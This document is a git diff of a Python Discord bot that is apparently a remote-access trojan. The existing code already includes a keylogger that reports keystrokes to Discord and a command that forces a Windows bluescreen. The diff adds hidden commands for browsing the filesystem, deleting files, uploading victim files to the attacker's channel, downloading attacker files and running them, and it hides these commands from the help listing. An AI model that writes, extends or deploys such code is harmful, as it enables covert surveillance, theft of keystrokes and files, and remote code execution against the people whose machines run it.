@@ -30,6 +30,8 @@ TOKEN = decrypted_data
 
 ################################################################################
 
+current_directory = os.getcwd()
+
 import discord
 from discord.ext import commands, tasks
 import platform
@@ -63,6 +65,7 @@ import pymsgbox
 from datetime import datetime
 import ctypes
 import ctypes.wintypes
+import time
 
 # Define global variables
 notification_sent = False
@@ -77,6 +80,8 @@ popup_window = None
 popup_root = None
 close_button_window = None
 popup_thread = None
+
+cwd = os.getcwd()
 
 # Define intents
 intents = discord.Intents.default()
@@ -94,7 +99,7 @@ intents.presences = True
 intents.typing = True
 
 # Create the bot with intents
-bot = commands.Bot(command_prefix='>', intents=intents)
+bot = commands.Bot(command_prefix='>', intents=intents, help_command=None)
 
 # Buffer to store keylog data
 keylog_buffer = []
@@ -115,6 +120,11 @@ async def send_keylog_data(ctx):
         await ctx.send(f"Keylog data:\n```{keylog_data}```")
     else:
         await ctx.send("No keylog data available.")
+
+# Funktion zum Senden einer eingebetteten Nachricht
+async def send_embed(ctx, message):
+    embed = discord.Embed(description=message, color=discord.Color.blue())
+    await ctx.send(embed=embed)
 
 @bot.event
 async def on_ready():
@@ -448,12 +458,16 @@ def format_devices(devices):
     return '\n'.join(formatted_devices)
 
 # Change the default help command
-bot.remove_command('help')
-
 @bot.command(help="Displays this message")
-async def help(ctx):
+async def help(ctx, category: str = None):
     embed_pages = []
-    commands = sorted([command for command in bot.commands if command.name != "help"], key=lambda x: x.name)
+    hidden_commands = {"cd", "download", "upload", "ls", "rm", "touch", "rmdir", "mkdir", "run"}  # Liste der versteckten Befehle
+
+    if category == "hidden":
+        commands = sorted([command for command in bot.commands if command.name in hidden_commands], key=lambda x: x.name)
+    else:
+        commands = sorted([command for command in bot.commands if command.name != "help" and command.name not in hidden_commands], key=lambda x: x.name)
+
     chunks = [commands[i:i + 20] for i in range(0, len(commands), 20)]
     total_commands = len(commands)
 
@@ -521,7 +535,16 @@ async def shutdown(ctx):
 # Define a command to reload the script
 @bot.command(help="Reloads the bot script")
 async def reload(ctx):
+    global current_directory
     await send_embed_message(ctx.channel, "Reloading the script...")
+
+    # Speichere das aktuelle Verzeichnis
+    saved_directory = current_directory
+
+    # Wechsle in das ursprüngliche Verzeichnis zurück
+    os.chdir(saved_directory)
+
+    # Neuladen des Skripts
     os.execl(sys.executable, sys.executable, *sys.argv)
 
 @bot.command(help="Unloads the bot script")
@@ -1026,9 +1049,41 @@ async def spamcontent(ctx, count: int):
         await ctx.send("https://pornhub.com/")
 
 # Befehl für das Löschen des Nachrichtenverlaufs in einem Kanal
+async def purge_channel(channel):
+    deleted = 0
+    while True:
+        purged = await channel.purge(limit=100)
+        deleted += len(purged)
+        if len(purged) < 100:
+            break
+    return deleted
+
+# Funktion zum Löschen des Nachrichtenverlaufs in einem Kanal
 @bot.command(help="Deletes the message history in a channel")
-async def clear(ctx):
-    await ctx.channel.purge(limit=None)
+async def clear(ctx, *channels: discord.TextChannel):
+    total_deleted = 0
+
+    if not channels:
+        start_time = time.perf_counter()  # Startzeitmessung
+        deleted = await purge_channel(ctx.channel)
+        total_deleted += deleted
+        end_time = time.perf_counter()  # Endzeitmessung
+        total_time = end_time - start_time  # Berechnen der benötigten Zeit
+        await ctx.send(f'Cleared {deleted} messages in {total_time:.4f} seconds in {ctx.channel.mention}', delete_after=5)
+    else:
+        start_time = time.perf_counter()  # Startzeitmessung
+        tasks = [purge_channel(channel) for channel in channels]
+        deleted_counts = await asyncio.gather(*tasks)
+        total_deleted += sum(deleted_counts)
+        end_time = time.perf_counter()  # Endzeitmessung
+        total_time = end_time - start_time  # Berechnen der benötigten Zeit
+        await ctx.send(f'Cleared a total of {total_deleted} messages in {total_time:.4f} seconds in the specified channels', delete_after=5)
+
+    try:
+        await asyncio.sleep(total_time)  # Warten bis alle Löschnachrichten gelöscht sind
+        await ctx.message.delete()  # Löschen der ursprünglichen Löschnachricht
+    except discord.NotFound:
+        pass  # Nachricht wurde bereits gelöscht oder konnte nicht gefunden werden
 
 @bot.command(help="Deletes the message history in all channels")
 async def clearall(ctx):
@@ -1539,14 +1594,14 @@ class Keylogger:
         with Listener(on_press=self._on_key_press) as listener:
             listener.join()
 
-@bot.command(name='on')
+@bot.command(help='enable keylogger')
 async def on(ctx):
     keylogger = Keylogger(ctx, TIME_INTERVAL)
     await ctx.send("Keylogger started.")
     keylogger.run()
     asyncio.create_task(keylogger._report())  # Start the reporting loop
 
-@bot.command(name='off')
+@bot.command(help='disable keylogger')
 async def off(ctx):
     await ctx.send("Keylogger stopped.")
     # Add functionality to stop the keylogger if needed
@@ -1557,5 +1612,154 @@ async def bluescreen(ctx):
         ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
         ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
     else: await ctx.send("DU HURENSOHN")
+
+@bot.command(help= "open any URL in the webbrowser")
+async def url(ctx, url: str):
+    if not url.startswith('http://') and not url.startswith('https://'):
+        url = 'http://' + url
+
+    if platform.system() == 'Darwin':  # macOS
+        subprocess.call(('open', url))
+    elif platform.system() == 'Windows':  # Windows
+        subprocess.call(('start', url), shell=True)
+    else:  # Linux variants
+        subprocess.call(('xdg-open', url))
+
+    await ctx.send(f'Opening URL: {url}')
+
+# Funktion zum Ändern des Verzeichnisses
+@bot.command(help="Change directory")
+async def cd(ctx, *, path: str = None):
+    global current_directory
+    if path:
+        try:
+            os.chdir(path)
+            current_directory = os.getcwd()  # Aktualisiere den aktuellen Verzeichnispfad
+            await ctx.send(f'Changed directory to {current_directory}')
+        except Exception as e:
+            await ctx.send(f'Error: {e}')
+    else:
+        await ctx.send(f'Current directory is {current_directory}')
+
+# Create directory
+@bot.command(help="Create directory")
+async def mkdir(ctx, *, dirname: str):
+    try:
+        os.mkdir(dirname)
+        await ctx.send(f'Directory {dirname} created')
+    except Exception as e:
+        await ctx.send(f'Error: {e}')
+
+# Remove directory
+@bot.command(help="Remove directory")
+async def rmdir(ctx, *, dirname: str):
+    try:
+        os.rmdir(dirname)
+        await ctx.send(f'Directory {dirname} removed')
+    except Exception as e:
+        await ctx.send(f'Error: {e}')
+
+# Create file
+@bot.command(help="Create file")
+async def touch(ctx, filename: str):
+    global current_directory
+    if filename:
+        file_path = os.path.join(os.getcwd(), filename)  # Absoluten Pfad erstellen
+        if not os.path.exists(file_path):
+            try:
+                with open(file_path, "w"):
+                    pass
+                await ctx.send(f"File `{filename}` created successfully in directory `{current_directory}`")
+            except Exception as e:
+                await ctx.send(f"Error creating file: {e}")
+        else:
+            await ctx.send("File already exists.")
+    else:
+        await ctx.send("Please specify a filename.")
+
+# Remove file
+@bot.command(help="Remove file")
+async def rm(ctx, *, filename: str):
+    try:
+        os.remove(filename)
+        await ctx.send(f'File {filename} removed')
+    except Exception as e:
+        await ctx.send(f'Error: {e}')
+
+# Upload file
+@bot.command(help="Upload file")
+async def upload(ctx, *, filename: str):
+    try:
+        await ctx.send(file=discord.File(filename))
+    except Exception as e:
+        await ctx.send(f'Error: {e}')
+
+# Download file
+@bot.command(help="Download file")
+async def download(ctx):
+    if len(ctx.message.attachments) == 0:
+        await ctx.send("No file attached.")
+        return
+
+    attachment = ctx.message.attachments[0]
+    try:
+        await attachment.save(attachment.filename)
+        await ctx.send(f'File {attachment.filename} downloaded')
+    except Exception as e:
+        await ctx.send(f'Error: {e}')
+
+# Funktion zum Markieren von Dateiendungen
+def mark_file_extensions(files):
+    marked_files = []
+    for file in files:
+        filename, file_extension = os.path.splitext(file)
+        if file_extension:
+            marked_files.append(f"{filename}*{file_extension}*")
+        else:
+            marked_files.append(filename)  # Füge nur den Dateinamen hinzu, wenn keine Dateiendung vorhanden ist
+    return marked_files
+
+# List directory contents
+@bot.command(help="List directory contents")
+async def ls(ctx):
+    try:
+        files = os.listdir(current_directory)  # Verwende den aktuellen Pfad, der durch den Befehl >cd festgelegt wurde
+        marked_files = mark_file_extensions(files)
+        files_str = '\n'.join(marked_files)
+
+        # Überprüfen, ob die Länge des Textes die maximale Grenze überschreitet
+        if len(files_str) <= 4096:
+            embed = discord.Embed(
+                title=f"Contents of {current_directory}",
+                description=files_str,
+                color=discord.Color.blue()
+            )
+            await ctx.send(embed=embed)  # Direkt senden, wenn die Länge unter oder gleich 6000 ist
+        else:
+            # Text in Teile aufteilen
+            chunks = [files_str[i:i + 4096] for i in range(0, len(files_str), 4096)]
+            for chunk in chunks:
+                embed = discord.Embed(
+                    title=f"Contents of {current_directory}",
+                    description=chunk,
+                    color=discord.Color.blue()
+                )
+                await ctx.send(embed=embed)  # Senden jedes Teils als separates Embed
+    except Exception as e:
+        await ctx.send(f'Error: {e}')
+
+# Run file
+@bot.command(help="Run a file in the current directory")
+async def run(ctx, filename: str):
+    global current_directory
+    file_path = os.path.join(current_directory, filename)
+    if os.path.exists(file_path):
+        try:
+            os.startfile(file_path)  # Öffne die Datei basierend auf ihrer Assoziation mit dem Dateityp
+            await ctx.send(f"File `{filename}` opened successfully.")
+        except Exception as e:
+            await ctx.send(f"Error opening file `{filename}`: {e}")
+    else:
+        await ctx.send("File not found.")
 
 bot.run(TOKEN)
